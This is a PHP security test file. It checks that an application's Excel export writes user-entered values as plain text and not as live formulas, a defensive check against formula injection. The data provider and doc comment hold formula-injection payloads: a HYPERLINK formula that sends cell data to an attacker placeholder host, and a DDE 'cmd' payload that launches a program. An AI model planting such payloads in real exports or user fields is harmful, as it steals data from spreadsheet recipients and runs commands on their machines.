<?php

namespace Tests\Security;

use App\Services\ExcelExportService;
use CodeIgniter\Test\CIUnitTestCase;
use OpenSpout\Common\Entity\Cell;
use OpenSpout\Common\Entity\Row;
use OpenSpout\Common\Entity\Style\Style;
use OpenSpout\Writer\XLSX\Writer;
use ReflectionMethod;

/**
 * Exported spreadsheets must never contain a formula.
 *
 * OpenSpout's Cell::fromValue() ends with:
 *
 *     if (isset($value[0]) && '=' === $value[0]) {
 *         return new FormulaCell($value, ...);
 *     }
 *
 * so any exported string a user typed starting with '=' is written as a live
 * <f> element. Every export in this app carries user-typed values -- candidate
 * names, remarks, addresses -- so a remark of
 *
 *     =HYPERLINK("http://attacker/?x="&A1,"Click here")
 *
 * would reach the recipient's Excel as an executable formula, inside a file
 * they received from a system they trust.
 *
 * ExcelExportService::exportToXlsx() reads institute settings from the
 * database to build the filename, which is not available in the test
 * environment, so these tests drive the private row builder directly and write
 * a real workbook with it. That still exercises the thing that matters: what
 * ends up in the sheet XML.
 *
 * @internal
 */
final class ExcelFormulaInjectionTest extends CIUnitTestCase
{
    /** @param array<array-key, mixed> $values */
    private function buildRow(array $values, array $columnStyles = []): Row
    {
        $method = new ReflectionMethod(ExcelExportService::class, 'literalRow');

        return $method->invoke(new ExcelExportService(), $values, $columnStyles);
    }

    /** Writes rows through OpenSpout and returns the worksheet XML. */
    private function sheetXml(Row ...$rows): string
    {
        $path = tempnam(sys_get_temp_dir(), 'xlsx') . '.xlsx';

        $writer = new Writer();
        $writer->openToFile($path);

        foreach ($rows as $row) {
            $writer->addRow($row);
        }

        $writer->close();

        $zip = new \ZipArchive();
        $this->assertTrue($zip->open($path) === true, 'writer did not produce a readable .xlsx');

        $xml = '';

        for ($i = 0; $i < $zip->numFiles; $i++) {
            $name = (string) $zip->getNameIndex($i);

            if (str_contains($name, 'sheet') && str_ends_with($name, '.xml')) {
                $xml .= (string) $zip->getFromIndex($i);
            }
        }

        $zip->close();
        unlink($path);

        $this->assertNotSame('', $xml, 'no worksheet XML in the archive');

        return $xml;
    }

    /**
     * @dataProvider formulaPayloads
     */
    public function testPayloadIsNotBuiltAsAFormulaCell(string $payload): void
    {
        $cells = $this->buildRow(['Alice', $payload, 7])->cells;

        $this->assertInstanceOf(
            Cell\StringCell::class,
            $cells[1],
            "{$payload} was built as " . $cells[1]::class . ' instead of a StringCell.'
        );
    }

    /**
     * @dataProvider formulaPayloads
     */
    public function testPayloadDoesNotReachTheSheetAsAFormula(string $payload): void
    {
        $xml = $this->sheetXml($this->buildRow(['Alice', $payload, 7]));

        $this->assertStringNotContainsString('<f>', $xml, "{$payload} was written as a live formula.");
    }

    public static function formulaPayloads(): array
    {
        return [
            'hyperlink exfiltration' => ['=HYPERLINK("http://attacker.example/?x="&A1,"Click")'],
            'cell reference'         => ['=A1'],
            'sum'                    => ['=SUM(A1:A9)'],
            'legacy cmd payload'     => ['=cmd|\' /C calc\'!A0'],
        ];
    }

    /**
     * Guards the premise: unpatched OpenSpout really does promote these. If a
     * future upgrade stops doing it, this fails and the custom row builder can
     * be reconsidered.
     */
    public function testOpenSpoutStillPromotesFormulasWithoutTheFix(): void
    {
        $this->assertInstanceOf(
            Cell\FormulaCell::class,
            Cell::fromValue('=SUM(A1:A9)'),
            'OpenSpout no longer promotes "="-leading strings; literalRow() may no longer be needed.'
        );
    }

    /** Numbers must stay numeric, or every export's totals and sorting change. */
    public function testNumbersAreStillNumeric(): void
    {
        $cells = $this->buildRow(['Alice', 'ordinary remark', 42])->cells;

        $this->assertInstanceOf(Cell\NumericCell::class, $cells[2]);
        $this->assertStringContainsString('<v>42</v>', $this->sheetXml($this->buildRow(['Alice', 'x', 42])));
    }

    /** Empty strings must stay empty cells, not become zero-length strings. */
    public function testEmptyValuesKeepTheirExistingHandling(): void
    {
        $cells = $this->buildRow(['', null, 1])->cells;

        $this->assertInstanceOf(Cell\EmptyCell::class, $cells[0]);
        $this->assertInstanceOf(Cell\EmptyCell::class, $cells[1]);
    }

    /** Per-column number formats must still be applied. */
    public function testColumnStylesAreStillApplied(): void
    {
        $style = (new Style())->withFormat('dd/mm/yyyy');
        $cells = $this->buildRow(['Alice', 'text', 5], [2 => $style])->cells;

        $this->assertSame('dd/mm/yyyy', $cells[2]->style?->format);
    }

    /** Ordinary text must still survive the round trip. */
    public function testOrdinaryTextStillExports(): void
    {
        $cells = $this->buildRow(['Alice', 'ordinary remark', 1])->cells;

        $this->assertInstanceOf(Cell\StringCell::class, $cells[0]);
        $this->assertSame('Alice', $cells[0]->getValue());
        $this->assertSame('ordinary remark', $cells[1]->getValue());
    }
}
